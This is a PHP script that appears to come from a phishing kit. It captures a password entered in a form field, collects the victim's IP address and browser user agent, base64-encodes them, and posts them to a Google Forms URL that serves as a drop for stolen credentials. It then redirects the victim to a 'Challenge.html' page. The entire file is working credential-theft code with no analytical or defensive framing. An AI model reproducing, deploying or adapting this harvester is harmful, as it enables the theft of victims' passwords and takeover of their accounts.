<?php
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Keyr3ZulT -----------------------\n";
$message .= "KeyPass: ".$_POST['inputPassword']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------=IP Adress & Date=---------\n";
$message .= "Country: ".$country."\n";
$message .= "State: ".$ip_state."\n";
$message .= "City: ".$ip_city."\n";
$message .= "Date: ".$adddate."\n";
$message .= "Broswer Agent: ".$user_agent."\n";
$message .= "IP: ".$ip."\n";
$message .= "UA: ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "-----------------------------\n";

$feedback = base64_encode($message);

$url =  "https://docs.google.com/forms/d/e/1FAIpQLScYFzLsEXw2sgUwb-u0W-h9KUzJ3vmnrkkE5M5SIECgw7tCxg/formResponse";

$pf['entry.1802856847'] = $feedback;

$pf['submit'] = 'Submit';

foreach ( $pf as $key => $value) {
	$post_items[] = $key . '=' . $value;
}

//create the final string to be posted using implode()
$post_string = implode ('&', $post_items);

//create cURL connection
$curl_connection = curl_init($url);

//set options
curl_setopt($curl_connection, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($curl_connection, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)");
curl_setopt($curl_connection, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl_connection, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl_connection, CURLOPT_FOLLOWLOCATION, 1);

//set data to be posted
curl_setopt($curl_connection, CURLOPT_POSTFIELDS, $post_string);

//perform our request
$result = curl_exec($curl_connection);

//close the connection
curl_close($curl_connection);

header("Location:Challenge.html");
?>